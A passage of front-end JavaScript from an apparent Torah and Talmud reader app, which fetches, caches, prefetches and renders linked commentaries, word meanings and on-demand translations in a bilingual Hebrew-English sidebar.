        // commentary) and rejects, with the HTTP status when there was one, if
        // the request failed. The cache and the in-flight map are shared by
        // the selection lookup, the pointer-down prefetch and the preloader.
        function requestCommentaryLinks(normalized) {
            if (commentaryLinksCache.has(normalized)) {
                return Promise.resolve(commentaryLinksCache.get(normalized));
            }
            if (commentaryLinksInflight.has(normalized)) {
                return commentaryLinksInflight.get(normalized);
            }
            const request = (async () => {
                const payload = await fetchCommentaryLinksPayload(normalized);
                const refs = extractCommentaryRefs(payload);
                const result = refs.length ? { links: payload, resolvedRef: normalized } : null;
                _cacheBounded(commentaryLinksCache, normalized, result, 300);
                return result;
            })().finally(() => commentaryLinksInflight.delete(normalized));
            commentaryLinksInflight.set(normalized, request);
            return request;
        }

        function fetchCommentaryLinks(normalized) {
            return requestCommentaryLinks(normalized).catch(() => null);
        }

        // Commentary text, fetched WITHOUT on-demand translation first so the
        // Sefaria text paints immediately; the backend's machine-translation
        // pass (helpers.py::_fill_missing_english_lines, up to ~1.2s) only
        // runs afterwards, and only when some lines actually lack English.
        const commentaryTextInflight = new Map();

        function commentaryNeedsTranslation(data) {
            const lines = Array.isArray(data?.lines) ? data.lines : [];
            return lines.some((line) => String(line?.he || '').trim() && !String(line?.en || '').trim());
        }

        function fetchCommentaryText(ref, { translate = false } = {}) {
            const cacheKey = translate ? `${ref}\u0000t` : ref;
            if (commentaryTextCache.has(cacheKey)) {
                return Promise.resolve(commentaryTextCache.get(cacheKey));
            }
            // A translated payload is a superset of the plain one.
            if (!translate && commentaryTextCache.has(`${ref}\u0000t`)) {
                return Promise.resolve(commentaryTextCache.get(`${ref}\u0000t`));
            }
            if (commentaryTextInflight.has(cacheKey)) {
                return commentaryTextInflight.get(cacheKey);
            }
            const request = (async () => {
                try {
                    const resp = await fetch(`/api/text/${encodeURIComponent(ref)}?autotranslate=${translate ? 1 : 0}`);
                    const data = await resp.json();
                    if (!resp.ok || data?.error) {
                        throw new Error(data?.error || `HTTP ${resp.status}`);
                    }
                    _cacheBounded(commentaryTextCache, cacheKey, data, 320);
                    return data;
                } finally {
                    commentaryTextInflight.delete(cacheKey);
                }
            })();
            commentaryTextInflight.set(cacheKey, request);
            return request;
        }

        // The text of the main commentators on one verse, in one cached request
        // (stage=texts of the sidebar endpoint), filled into the same cache the
        // chooser reads: opening one of them paints from memory, with its
        // translation, instead of two sequential round trips. Passages the
        // server did not translate go under the plain key, so opening them still
        // runs the on-demand translation.
        const sidebarTextsInflight = new Map();
        const sidebarTextsDone = new Map();

        function loadSidebarTexts(ref) {
            if (sidebarTextsDone.has(ref)) return Promise.resolve();
            if (sidebarTextsInflight.has(ref)) return sidebarTextsInflight.get(ref);
            const request = (async () => {
                const resp = await fetch(`/api/sidebar/${encodeURIComponent(ref)}?stage=texts`);
                if (!resp.ok) throw httpStatusError(resp.status);
                const payload = await resp.json();
                const texts = payload?.texts && typeof payload.texts === 'object' ? payload.texts : {};
                Object.entries(texts).forEach(([commentaryRef, data]) => {
                    if (!data || !Array.isArray(data.lines)) return;
                    const key = data.translation_attempted ? `${commentaryRef}\u0000t` : commentaryRef;
                    _cacheBounded(commentaryTextCache, key, data, 320);
                });
                _cacheBounded(sidebarTextsDone, ref, true, 300);
            })().finally(() => sidebarTextsInflight.delete(ref));
            sidebarTextsInflight.set(ref, request);
            return request;
        }

        // Intent prefetch for the commentary chooser: a short hover dwell,
        // keyboard focus, or the press itself starts the text request before
        // the click lands. Deliberately not "prefetch the whole list" --
        // /api/text/* sits in the 30/min "fanout" rate-limit class
        // (backend/rate_limit.py), shared with the reader's own chunk loads.
        let commentaryHoverPrefetchTimer = null;
        function prefetchCommentaryText(ref) {
            const normalized = String(ref || '').trim();
            if (!normalized) return;
            fetchCommentaryText(normalized).catch(() => { });
        }

        function commentaryButtonFromEvent(event) {
            const button = event.target?.closest?.('[data-commentary-ref]');
            return button && selectionInsightsBody?.contains(button) ? button : null;
        }

        function wireCommentaryIntentPrefetch() {
            if (!selectionInsightsBody || selectionInsightsBody.dataset.prefetchBound === '1') return;
            selectionInsightsBody.dataset.prefetchBound = '1';
            selectionInsightsBody.addEventListener('pointerover', (event) => {
                const button = commentaryButtonFromEvent(event);
                clearTimeout(commentaryHoverPrefetchTimer);
                if (!button) return;
                commentaryHoverPrefetchTimer = setTimeout(() => prefetchCommentaryText(button.dataset.commentaryRef), 90);
            });
            ['pointerdown', 'focusin'].forEach((type) => {
                selectionInsightsBody.addEventListener(type, (event) => {
                    const button = commentaryButtonFromEvent(event);
                    if (button) prefetchCommentaryText(button.dataset.commentaryRef);
                });
            });
            // Opening an author group prefetches its first entry.
            selectionInsightsBody.addEventListener('toggle', (event) => {
                const details = event.target;
                if (!(details instanceof HTMLDetailsElement) || !details.open) return;
                fillCommentaryGroup(details);
                const first = details.querySelector('[data-commentary-ref]');
                if (first) prefetchCommentaryText(first.dataset.commentaryRef);
            }, true);
        }

        function getCommentaryAuthorLabel(ref) {
            const raw = String(ref || '').trim();
            if (!raw) return t('Unknown commentator', 'פרשן לא ידוע');
            const sefariaHe = isHebrewMode() ? commentaryRefMeta.get(raw)?.he : '';
            return sefariaHe || getCommentaryAuthorDisplayName(getCommentaryAuthorBase(raw));
        }

        function groupCommentaryRefsByAuthor(refs) {
            if (!Array.isArray(refs) || !refs.length) return [];

            const byAuthor = new Map();
            refs.forEach((ref) => {
                const author = getCommentaryAuthorLabel(ref);
                const authorKey = normalizeLibraryLookupKey(author || ref) || String(author || ref).toLowerCase();
                if (!byAuthor.has(authorKey)) {
                    const base = getCommentaryAuthorBase(ref).toLowerCase();
                    byAuthor.set(authorKey, {
                        author,
                        refs: [],
                        rank: commentaryRank(base),
                        bucket: commentaryBucket(ref),
                    });
                }
                byAuthor.get(authorKey).refs.push(ref);
            });

            return Array.from(byAuthor.values())
                .sort((a, b) => (a.rank - b.rank) || (a.bucket - b.bucket)
                    || String(a.author).localeCompare(String(b.author), undefined, { numeric: true }))
                .map((entry) => ({
                    author: entry.author,
                    refs: entry.refs
                        .filter(Boolean)
                        .sort((a, b) => String(a).localeCompare(String(b), undefined, { numeric: true })),
                }));
        }

        function renderCommentaryChooser(groupedCommentaries) {
            if (!Array.isArray(groupedCommentaries) || !groupedCommentaries.length) {
                return `<p class="text-xs text-slate-500 italic">${t('No linked commentaries found for this passage.', 'לא נמצאו מפרשים מקושרים לקטע זה.')}</p>`;
            }

            // A verse can link hundreds of passages (Genesis 1:1: ~700 in ~95
            // groups), so each group's buttons are built when it is opened.
            renderedCommentaryGroups = groupedCommentaries;
            return groupedCommentaries.map((group, index) => `
                    <details class="rounded-sm border border-slate-200 bg-slate-50 p-2" data-commentary-group="${index}">
                        <summary class="cursor-pointer text-sm font-semibold text-slate-700 flex items-center justify-between">
                            <span>${escapeHtml(group.author)}</span>
                            <span class="text-[11px] text-slate-500">${group.refs.length}</span>
                        </summary>
                        <div class="mt-2 space-y-1"></div>
                    </details>
                `).join('');
        }

        let renderedCommentaryGroups = [];

        function fillCommentaryGroup(details) {
            const body = details?.querySelector(':scope > div');
            const group = renderedCommentaryGroups[Number(details?.dataset.commentaryGroup)];
            if (!body || !group || body.childElementCount) return;
            body.innerHTML = renderCommentaryGroupRefs(group);
        }

        function renderCommentaryGroupRefs(group) {
            return group.refs.map((ref) => {
                const encoded = encodeURIComponent(ref);
                const displayRef = localizeCommentaryReferenceLabel(ref);
                const textAlignClass = isHebrewMode() ? 'text-end' : 'text-start';
                const refDir = isHebrewMode() ? 'rtl' : 'ltr';
                return `
                    <button type="button" data-onclick="openCommentaryInline" data-onclick-arg="${encoded}" data-onclick-encoding="uri"
                        data-commentary-ref="${escapeHtml(ref)}"
                        dir="${refDir}"
                        class="block w-full ${textAlignClass} px-3 py-2 rounded-sm border border-slate-200 bg-white hover:bg-slate-100 text-sm text-slate-700 transition">
                        ${escapeHtml(displayRef)}
                    </button>
                `;
            }).join('');
        }

        // The word-meaning card above the commentary list: the gloss with up to
        // three alternatives, "No definition found", or nothing.
        function wordMeaningCardHtml(wordInfo) {
            const word = escapeHtml(wordInfo?.word || '');
            const card = (body) => `
                    <div class="rounded-lg border border-[#d7c8ad] bg-[#f2eadc] px-3 py-2">
                        <p class="text-[11px] uppercase tracking-widest text-[#5d4c36] font-bold">${t('Word Meaning', 'משמעות מילה')}</p>
                        ${body}
                    </div>
                `;
            if (!wordInfo?.meaning) {
                return wordInfo?.notFound
                    ? card(`<p class="text-sm text-[#4f4130] mt-1"><span class="font-semibold">${word}</span>: ${t('No definition found', 'לא נמצאה הגדרה')}</p>`)
                    : '';
            }
            const primaryMeaning = String(wordInfo.meaning).trim().toLowerCase();
            const altMeanings = Array.isArray(wordInfo.alternatives)
                ? wordInfo.alternatives
                    .map((value) => String(value || '').trim())
                    .filter((value) => value && value.toLowerCase() !== primaryMeaning)
                    .slice(0, 3)
                : [];
            const altMarkup = altMeanings.length
                ? `<p class="text-xs text-[#6a5842] mt-1">${altMeanings.map((value) => escapeHtml(value)).join(' · ')}</p>`
                : '';
            return card(`<p class="text-sm text-[#4f4130] mt-1"><span class="font-semibold">${word}</span>: ${escapeHtml(wordInfo.meaning)}</p>
                        ${altMarkup}`);
        }

        function renderSelectionInsightsChooser() {
            if (!selectionInsightsBody) return;

            // "Back to list" after the reader has read on: list the verse they
            // are on now, not the one the list was first opened for.
            if (selectionCommentaryState.mode === 'reading') {
                const liveRef = commentaryPreloader?.currentRef() || '';
                if (liveRef && liveRef !== selectionCommentaryState.readingRef) {
                    void renderReadingCommentary(liveRef);
                    return;
                }
            }

            selectionCommentaryState.activeCommentaryRef = '';

            const groupedCommentaries = selectionCommentaryState.groupedCommentaries;
            const hasWordMeaning = Boolean(selectionCommentaryState.wordInfo?.meaning);

            // If no commentaries and no word meaning, hide the section
            if ((!Array.isArray(groupedCommentaries) || !groupedCommentaries.length) && !hasWordMeaning) {
                selectionInsightsBody.innerHTML = '';
                hideSelectionInsights();
                return;
            }

            let html = wordMeaningCardHtml(selectionCommentaryState.wordInfo);

            if (Array.isArray(groupedCommentaries) && groupedCommentaries.length) {
                html += `
                    <div class="rounded-lg border border-slate-200 bg-white px-3 py-3">
                        <p class="text-[11px] uppercase tracking-widest text-slate-500 font-bold mb-2">${t('Linked Commentaries', 'מפרשים מקושרים')}</p>
                        <p class="text-xs text-slate-500 mb-2">${t('Choose a commentator to load the commentary text here in the sidebar.', 'בחר פרשן כדי לטעון כאן את הטקסט של הפירוש בסרגל הצד.')}</p>
                        <div class="space-y-2">${renderCommentaryChooser(groupedCommentaries)}</div>
                    </div>
                `;
            }

            selectionInsightsBody.innerHTML = html;
            selectionInsightsBody.setAttribute('aria-busy', 'false');
            wireCommentaryIntentPrefetch();
            showSelectionInsights();
            selectionInsightsHint.textContent = selectionCommentaryState.mode === 'reading'
                ? t('Commentary on', 'פירושים על') + ` ${readingRefLabel(selectionCommentaryState.readingRef)}`
                : t('Selected text:', 'הטקסט שנבחר:') + ` ${selectionCommentaryState.selectedText}`;
        }

        function readingRefLabel(ref) {
            return isHebrewMode() ? localizeReferenceLabel(ref) : String(ref || '');
        }

        // ── Commentary for the verse being read ──────────────────────────────
        // Opening the sidebar without selecting anything lists the commentary
        // on the verse the reader is on -- already loaded, see
        // ensureCommentaryPreloader -- and follows them as they read on.
        let commentaryPreloader = null;

        function commentaryBaseRefForRow(row) {
            const chunkEl = row?.closest?.('.reader-source-clean[data-text-chunk-index]');
            const chunkIndex = Number.parseInt(chunkEl?.dataset?.textChunkIndex ?? '', 10);
            // Per chunk: a chapter that infinite scroll appended below the
            // first one is not window.currentTextPayload.
            const chunkRef = Number.isNaN(chunkIndex) ? '' : getCurrentTextPayloadChain()[chunkIndex]?.ref;
            return String(chunkRef || window.currentTextPayload?.ref || appState.currentView?.value || '').trim();
        }

        function commentaryRefForRow(row) {
            if (!row) return '';
            return buildSegmentReference(commentaryBaseRefForRow(row), row.dataset?.segment || '')
                .replace(/\s+/g, ' ')
                .trim();
        }

        function ensureCommentaryPreloader() {
            if (commentaryPreloader) return commentaryPreloader;
            const factory = window.ShelahCommentaryPreload?.createCommentaryPreloader;
            // main.js (an ES module) hasn't run yet: the next render retries.
            if (typeof factory !== 'function') return null;
            commentaryPreloader = factory({
                getScrollEl: getPrimaryScrollElement,
                resolveRef: commentaryRefForRow,
                isEligible: () => appState.currentView?.type === 'text' && isCommentaryEligiblePrimaryText(),
                loadLinks: (ref) => requestCommentaryLinks(ref),
                // A verse with no commentary has no text to preload either.
                loadTexts: async (ref) => {
                    if (commentaryLinksCache.get(ref)) await loadSidebarTexts(ref);
                },
                onReadingRef: (ref) => {
                    const following = selectionCommentaryState.mode === 'reading'
                        && !selectionCommentaryState.activeCommentaryRef
                        && !selectionInsights?.classList.contains('hidden');
                    if (following) void renderReadingCommentary(ref);
                },
            });
            return commentaryPreloader;
        }

        // main.js may finish after the first text renders; try again once the page has loaded.
        window.addEventListener('load', () => ensureCommentaryPreloader()?.refresh(), { once: true });

        function buildGroupedCommentaries(links, currentRef) {
            let commentaryRefs = extractCommentaryRefs(links);
            if (!commentaryRefs.length) {
                const tanakhMatch = CHAPTER_REF_RE.exec(currentRef);
                const tanakhBook = normalizeChapterGridBookName(tanakhMatch?.[1] || '');
                if (tanakhBook && CHAPTER_GRID_BOOKS[tanakhBook]) {
                    const fallbackVerseRef = currentRef.includes(':')
                        ? currentRef
                        : `${tanakhBook} ${tanakhMatch?.[2] || 1}:1`;
                    commentaryRefs = [`Rashi on ${fallbackVerseRef}`];
                }
            }
            return groupCommentaryRefsByAuthor(commentaryRefs);
        }

        async function renderReadingCommentary(ref) {
            if (!selectionInsightsBody || !ref) return;
            const lookupSeq = ++selectionInsightsSeq;
            const isCurrent = () => lookupSeq === selectionInsightsSeq && selectionCommentaryState.mode === 'reading';

            selectionCommentaryState.readingRef = ref;
            selectionCommentaryState.activeCommentaryRef = '';
            selectionCommentaryState.wordInfo = null;
            selectionCommentaryState.selectedText = '';
            selectionInsightsHint.textContent = t('Commentary on', 'פירושים על') + ` ${readingRefLabel(ref)}`;
            if (!commentaryLinksCache.has(ref)) {
                selectionInsightsBody.setAttribute('aria-busy', 'true');
                selectionInsightsBody.innerHTML = `
                    <div class="rounded-lg border border-slate-200 bg-white px-3 py-3 space-y-2" aria-hidden="true">
                        <div class="sk-reader-para" style="width:45%"></div>
                        <div class="sk-reader-para"></div>
                        <div class="sk-reader-para"></div>
                        <div class="sk-reader-para" style="width:70%"></div>
                    </div>`;
            }

            const { links } = await fetchCommentaryLinksWithFallback([ref]);
            if (!isCurrent()) return;
            const grouped = buildGroupedCommentaries(links, ref);
            selectionCommentaryState.groupedCommentaries = grouped;
            if (!grouped.length) {
                selectionInsightsBody.innerHTML = `<p class="text-xs text-slate-500 italic">${t('No linked commentaries found for this passage.', 'לא נמצאו מפרשים מקושרים לקטע זה.')}</p>`;
                selectionInsightsBody.setAttribute('aria-busy', 'false');
                return;
            }
            renderSelectionInsightsChooser();
        }

        async function startReadingCommentary() {
            selectionCommentaryState.mode = 'reading';
            setCommentaryAvailability(true);
            showSelectionInsights();
            const preloader = ensureCommentaryPreloader();
            preloader?.refresh({ immediate: true });
            const ref = preloader?.currentRef() || '';
            if (ref) await renderReadingCommentary(ref);
            else resetSelectionInsights();
        }

        async function refreshSelectionWordMeaning() {
            const word = String(selectionCommentaryState.wordInfo?.word || '').trim();
            if (!word) return;

            const lang = !containsHebrewLetters(word) && isHebrewMode() ? 'he' : 'en';
            try {
                const resp = await fetch(`/api/word/meaning?word=${encodeURIComponent(word)}&lang=${encodeURIComponent(lang)}`);
                if (!resp.ok) return;

                const payload = await resp.json();
                if (!payload?.meaning) return;

                selectionCommentaryState.wordInfo = {
                    word: payload.word || word,
                    meaning: payload.meaning || '',
                    alternatives: Array.isArray(payload.alternatives) ? payload.alternatives : [],
                };

                if (selectionCommentaryState.activeCommentaryRef) {
                    await openCommentaryInline(selectionCommentaryState.activeCommentaryRef);
                    return;
                }

                renderSelectionInsightsChooser();
            } catch {
                // Keep existing meaning when lookup refresh fails.
            }
        }

        // One comment of a commentary: its Hebrew paragraph, then its English.
        function renderCommentaryPart(heSource, enSource) {
            const he = normalizeDisplayText(heSource) ? escapeDisplayTextPreservingEmphasis(applyHebrewDisplaySettings(heSource)) : '';
            const en = normalizeDisplayText(enSource) ? escapeDisplayTextPreservingEmphasis(enSource) : '';
            if (!he && !en) return '';

            const hebrewMarkup = he
                ? `<p dir="rtl" lang="he" class="font-hebrew text-start text-[1.05rem] leading-[1.9] text-slate-800">${he.replaceAll('\n', '<br>')}</p>`
                : '';
            const englishGap = he ? ' mt-2' : '';
            const englishMarkup = en
                ? `<p dir="ltr" class="font-serif text-start text-sm leading-relaxed text-slate-700${englishGap}">${en.replaceAll('\n', '<br>')}</p>`
                : '';
            return `<div class="commentary-part">${hebrewMarkup}${englishMarkup}</div>`;
        }

        // A commentary arrives as several comments (Sefaria's passages): they
        // read as one block, in order, with no per-passage heading or number.
        // `passages` is the set of passage numbers the verse links, when the
        // commentary belongs to another verse too; it never empties the block.
        function renderInlineCommentaryLines(data, passages = null) {
            let sourceLines = Array.isArray(data?.lines) ? data.lines : [];
            if (passages?.size) {
                const linked = sourceLines.filter((line) => passages.has(Number(line?.segment)));
                if (linked.length) sourceLines = linked;
            }
            const renderedLines = sourceLines.map((line) => renderCommentaryPart(line?.he || '', line?.en || '')).filter(Boolean);

            if (renderedLines.length) {
                return renderedLines.join('');
            }

            const heFallbackLines = Array.isArray(data?.he) ? data.he : [];
            const enFallbackLines = Array.isArray(data?.en) ? data.en : [];
            const fallbackLen = Math.max(heFallbackLines.length, enFallbackLines.length);

            if (!fallbackLen) {
                return `<p class="text-xs text-slate-500 italic">${t('No commentary text found for this reference.', 'לא נמצא טקסט פירוש עבור הפניה זו.')}</p>`;
            }

            return Array.from({ length: fallbackLen }, (_, idx) => renderCommentaryPart(heFallbackLines[idx] || '', enFallbackLines[idx] || ''))
                .filter(Boolean)
                .join('');
        }

        // Content replaced in place, not a view change (audit §2.1 "Swap"):
        // hide, mutate synchronously, fade the new content in. No-op fallback
        // if motion.js hasn't loaded; fadeOpacity itself already goes instant
        // under reduced motion.
        function swapContent(el, mutate) {
            if (!el) { mutate(); return; }
            el.style.opacity = '0';
            mutate();
            const fade = window.ShelahMotion?.fadeOpacity;
            if (fade) void fade(el, 1, { duration: 0.15 });
            else el.style.opacity = '';
        }

        function renderCommentaryView(commentaryRef, data) {
            // One heading: the commentator and the reference, "Rashi on Genesis
            // 1:1", in English and in Sefaria's Hebrew for the same reference.
            const enTitle = String(data?.title || commentaryRef).trim();
            const heTitle = String(data?.heRef || commentaryRefMeta.get(commentaryRef)?.heRef || data?.heTitle || '').trim();
            // The Hebrew half is isolated so its run keeps its own direction
            // inside the English heading.
            const heTitleSuffix = heTitle ? ` · <bdi lang="he">${escapeHtml(heTitle)}</bdi>` : '';
            const displayTitle = isHebrewMode()
                ? escapeHtml(heTitle || enTitle)
                : escapeHtml(enTitle) + heTitleSuffix;

            // Keep the reader's place when the translated payload replaces
            // the plain one in place.
            const previousScroller = selectionInsightsBody.querySelector('[data-commentary-scroll]');
            const previousScrollTop = previousScroller ? previousScroller.scrollTop : 0;

            // M-12: a verse switch fades the new commentary in rather than
            // snapping (audit §3, "Findings: Motion").
            swapContent(selectionInsightsBody, () => {
                selectionInsightsBody.innerHTML = `
                    <div class="rounded-lg border border-slate-200 bg-white px-3 py-3">
                        <div class="flex items-center justify-between gap-2 mb-2">
                            <p class="text-[11px] uppercase tracking-widest text-slate-500 font-bold">${t('Commentary', 'פירוש')}</p>
                            <button type="button" data-onclick="renderSelectionInsightsChooser"
                                class="text-[11px] font-semibold text-[#004e5f] hover:underline">
                                ${t('Back to list', 'חזרה לרשימה')}
                            </button>
                        </div>
                        <h5 class="text-sm font-semibold text-slate-800 mb-3">${displayTitle}</h5>
                        <div class="max-h-[50dvh] overflow-y-auto pr-1" data-commentary-scroll>
                            ${renderInlineCommentaryLines(data, commentaryLinkedPassages.get(commentaryRef))}
                        </div>
                    </div>
                `;
                if (previousScrollTop) {
                    const scroller = selectionInsightsBody.querySelector('[data-commentary-scroll]');
                    if (scroller) scroller.scrollTop = previousScrollTop;
                }
            });
            selectionInsightsBody.setAttribute('aria-busy', 'false');
            const commentaryHintLabel = localizeCommentaryReferenceLabel(commentaryRef);
            selectionInsightsHint.textContent = t('Viewing commentary:', 'מציג פירוש:') + ` ${commentaryHintLabel}`;
        }

        async function openCommentaryInline(ref) {
            const commentaryRef = String(ref || '').trim();
            if (!commentaryRef || !selectionInsightsBody) return;

            selectionCommentaryState.activeCommentaryRef = commentaryRef;
            // A later click (or "Back to list") supersedes this one; checked
            // after every await so a slow response can't paint over it.
            const isCurrent = () => selectionCommentaryState.activeCommentaryRef === commentaryRef;

            const cached = commentaryTextCache.get(`${commentaryRef}\u0000t`) || commentaryTextCache.get(commentaryRef);
            if (!cached) {
                selectionInsightsHint.textContent = '';
                selectionInsightsBody.setAttribute('aria-busy', 'true');
                selectionInsightsBody.innerHTML = `
                    <div class="rounded-lg border border-slate-200 bg-white px-3 py-3 space-y-2" aria-hidden="true">
                        <div class="sk-reader-para" style="width:60%"></div>
                        <div class="sk-reader-para"></div>
                        <div class="sk-reader-para" style="width:80%"></div>
                        <div class="sk-reader-para"></div>
                    </div>`;
            }

            try {
                // Not preloaded: ask for the translated text alongside the plain
                // one rather than after it, so the translation no longer waits
                // for the plain text to arrive and paint first.
                const translatedRequest = cached ? null : fetchCommentaryText(commentaryRef, { translate: true });
                translatedRequest?.catch(() => { });
                const data = cached || await fetchCommentaryText(commentaryRef);
                if (!isCurrent()) return;
                renderCommentaryView(commentaryRef, data);

                // Progressive translation: only when some lines have Hebrew
                // but no English, and only if the payload we painted isn't
                // already the translated one. (The translated request can have
                // landed in the cache while the plain one was still arriving:
                // that does not mean the plain text on screen is translated.)
                if (data !== commentaryTextCache.get(`${commentaryRef}\u0000t`) && commentaryNeedsTranslation(data)) {
                    try {
                        const translated = await (translatedRequest || fetchCommentaryText(commentaryRef, { translate: true }));
                        if (isCurrent()) renderCommentaryView(commentaryRef, translated);
                    } catch {
                        // The untranslated text is already on screen.
                    }
                }
            } catch {
                if (!isCurrent()) return;
                selectionCommentaryState.activeCommentaryRef = '';
                selectionInsightsBody.innerHTML = `
                    <div class="rounded-lg border border-red-200 bg-red-50 px-3 py-3">
                        <p class="text-sm text-red-700 mb-2">${t('Unable to load commentary text right now.', 'לא ניתן לטעון כרגע את טקסט הפירוש.')}</p>
                        <button type="button" data-onclick="renderSelectionInsightsChooser"
                            class="text-[11px] font-semibold text-[#004e5f] hover:underline">
                            ${t('Back to linked commentaries', 'חזרה למפרשים מקושרים')}
                        </button>
                    </div>
                `;
                selectionInsightsBody.setAttribute('aria-busy', 'false');
                selectionInsightsHint.textContent = t('Could not load commentary.', 'לא ניתן לטעון את הפירוש.');
            }
        }

        async function openRashiCommentaryFromLibrary() {
            let baseRef = String(window.currentTextPayload?.ref || appState.currentView?.value || '').trim();
            if (!baseRef) {
                await readText('Genesis 1', { skipNavigationGrid: true });
                baseRef = 'Genesis 1';
            }

            if (!baseRef.includes(':') && /^(Genesis|Exodus|Leviticus|Numbers|Deuteronomy)\s+\d+$/i.test(baseRef)) {
                baseRef = `${baseRef}:1`;
            }

            const rashiRef = `Rashi on ${baseRef}`;
            setCommentaryAvailability(true);
            showSelectionInsights();

            revealCommentarySidebar();

            await openCommentaryInline(rashiRef);
        }

        function revealCommentarySidebar() {
            if (isMobileViewport()) {
                openMobilePanel('right');
            } else if (appState.prefs.showRightSidebar === false) {
                setSidebarVisibility('right', true);
            }
        }

        // The highlighted text worth a lookup. When there is none the panel is
        // closed, or left as it is, and this answers ''.
        function selectedTextForLookup() {
            if (!selectionInsightsBody || appState.currentView?.type !== 'text') {
                collapseCommentaryPanel();
                return '';
            }

            const selectedText = String(window.getSelection()?.toString() || '').replace(/\s+/g, ' ').trim();
            // A panel the reader opened on purpose (the Commentary button)
            // stays open when they click into the text or select too much.
            const keepReadingPanel = selectionCommentaryState.mode === 'reading';
            if (!selectedText) {
                if (keepReadingPanel) return '';
                resetSelectionInsights();
                collapseCommentaryPanel();
                return '';
            }

            if (selectedText.length > 220) {
                if (!keepReadingPanel) collapseCommentaryPanel();
                return '';
            }

            if (!isCommentaryEligiblePrimaryText()) {
                collapseCommentaryPanel();
                return '';
            }
            return selectedText;
        }

        // The ref the selection sits in and the refs to try for its commentary,
        // most specific first (verse, passage, chapter, daf).
        function commentaryRefCandidatesForSelection(sel) {
            const range = sel.rangeCount > 0 ? sel.getRangeAt(0) : null;
            const container = range?.commonAncestorContainer;
            const anchor = container?.nodeType === Node.ELEMENT_NODE ? container : (container?.parentElement ?? null);
            const segmentRow = anchor?.closest?.('.segment-row') || null;

            // The chunk the highlighted verse sits in, not just the first one
            // loaded: with infinite scroll the reader may be in a later chapter.
            const currentRef = (segmentRow && commentaryBaseRefForRow(segmentRow))
                || String(window.currentTextPayload?.ref || appState.currentView?.value || '').trim();
            const segmentRef = buildSegmentReference(currentRef, segmentRow?.dataset?.segment || '');
            const candidates = [];

            if (segmentRef) {
                candidates.push(segmentRef);
            }
            if (currentRef) {
                candidates.push(currentRef);
            }
            if (currentRef.includes(':')) {
                candidates.push(currentRef.split(':')[0]);
            }

            const talmudDafBaseMatch = /^(\S+(?:\s+\S+)*?\s+\d+[ab])(?::\d+)?$/i.exec(currentRef);
            if (talmudDafBaseMatch?.[1]) {
                candidates.push(String(talmudDafBaseMatch[1]).trim());
            }
            return { currentRef, candidates };
        }

        // Skeleton feedback as soon as we know this lookup won't resolve
        // instantly from cache. This used to only paint when the panel
        // was already open, so a first selection (panel closed) showed
        // nothing at all until the network round-trip finished -- which
        // read as the sidebar hanging rather than loading. Opening the
        // panel early means a selection that ends up with no commentary
        // or meaning briefly flashes open then collapses (see the
        // `collapseCommentaryPanel()` call below); that's preferable to
        // no feedback during a slow lookup.
        function showSelectionLoadingSkeleton() {
            selectionCommentaryState.activeCommentaryRef = '';
            selectionInsightsBody.setAttribute('aria-busy', 'true');
            selectionInsightsBody.innerHTML = `
                <div class="rounded-lg border border-slate-200 bg-white px-3 py-3 space-y-2" aria-hidden="true">
                    <div class="sk-reader-para" style="width:45%"></div>
                    <div class="sk-reader-para"></div>
                    <div class="sk-reader-para"></div>
                    <div class="sk-reader-para" style="width:70%"></div>
                </div>`;
            showSelectionInsights();
            revealCommentarySidebar();
        }

        // The word a one-word selection names, stripped of punctuation ('' for
        // a longer selection, which is a passage, not a word to look up).
        function singleWordOf(selectedText) {
            if (selectedText.split(/\s+/).length !== 1) return '';
            return selectedText.replace(/[^A-Za-z\u0590-\u05FF'-]/g, '').trim();
        }

        function fetchWordMeaning(cleanWord) {
            if (!cleanWord) return Promise.resolve(null);
            const lang = !containsHebrewLetters(cleanWord) && isHebrewMode() ? 'he' : 'en';
            return fetch(`/api/word/meaning?word=${encodeURIComponent(cleanWord)}&lang=${encodeURIComponent(lang)}`)
                .then(async (resp) => {
                    // A word with no lexicon entry is a result, not a failure:
                    // the panel says so instead of staying silent.
                    if (resp.status === 404) return { word: cleanWord, meaning: '', alternatives: [], notFound: true };
                    if (!resp.ok) return null;
                    return await resp.json();
                })
                .catch(() => null);
        }

        function normalizeWordInfo(info, cleanWord) {
            return {
                word: info.word || cleanWord,
                meaning: info.meaning || '',
                alternatives: Array.isArray(info.alternatives) ? info.alternatives : [],
                notFound: Boolean(info.notFound) && !info.meaning,
            };
        }

        function mergeLateWordMeaning(wordPromise, cleanWord, isCurrent) {
            void wordPromise.then((lateWordInfo) => {
                if (!isCurrent() || !(lateWordInfo?.meaning || lateWordInfo?.notFound)) return;
                selectionCommentaryState.wordInfo = normalizeWordInfo(lateWordInfo, cleanWord);
                // Only re-render the list view; an open commentary keeps
                // the meaning for when the reader goes back to the list.
                if (!selectionCommentaryState.activeCommentaryRef) renderSelectionInsightsChooser();
            });
        }

        // The word meaning if it has already arrived. If not, and there are
        // commentaries to show, it is left pending (merged in when it lands);
        // with nothing else to show, it is waited for.
        async function settledWordInfo(wordPromise, hasCommentaries) {
            const WORD_PENDING = Symbol('word-pending');
            const wordInfo = await Promise.race([wordPromise, Promise.resolve(WORD_PENDING)]);
            if (wordInfo !== WORD_PENDING) return { wordInfo, pending: false };
            if (hasCommentaries) return { wordInfo: null, pending: true };
            return { wordInfo: await wordPromise, pending: false };
        }

        async function updateSelectionInsights() {
            // Newer selections (or a cleared one) supersede older lookups:
            // every await below is followed by an isCurrent() check so a slow
            // response can't paint over the passage the reader has moved to.
            const lookupSeq = ++selectionInsightsSeq;
            const isCurrent = () => lookupSeq === selectionInsightsSeq;

            const selectedText = selectedTextForLookup();
            if (!selectedText) return;

            const { currentRef, candidates } = commentaryRefCandidatesForSelection(window.getSelection());
            selectionCommentaryState.mode = 'selection';
            selectionCommentaryState.readingRef = '';

            const cleanWord = singleWordOf(selectedText);

            selectionInsightsHint.textContent = t('Loading selected passage tools...', 'טוען כלים לקטע שנבחר...');
            if (selectionInsightsBody && !commentaryLinksCache.has(candidates[0])) showSelectionLoadingSkeleton();

            const commentaryPromise = fetchCommentaryLinksWithFallback(candidates);
            const wordPromise = fetchWordMeaning(cleanWord);

            // Don't hold the commentary list hostage to the word lookup (it can
            // fall back to an online translation): if the links arrive first,
            // render them now and merge the meaning in when it lands.
            const { links } = await commentaryPromise;
            if (!isCurrent()) return;
            const groupedCommentaries = buildGroupedCommentaries(links, currentRef);
            const { wordInfo, pending } = await settledWordInfo(wordPromise, groupedCommentaries.length > 0);
            if (!isCurrent()) return;

            const hasWordMeaning = Boolean(cleanWord && wordInfo?.meaning);
            if (!groupedCommentaries.length && !hasWordMeaning) {
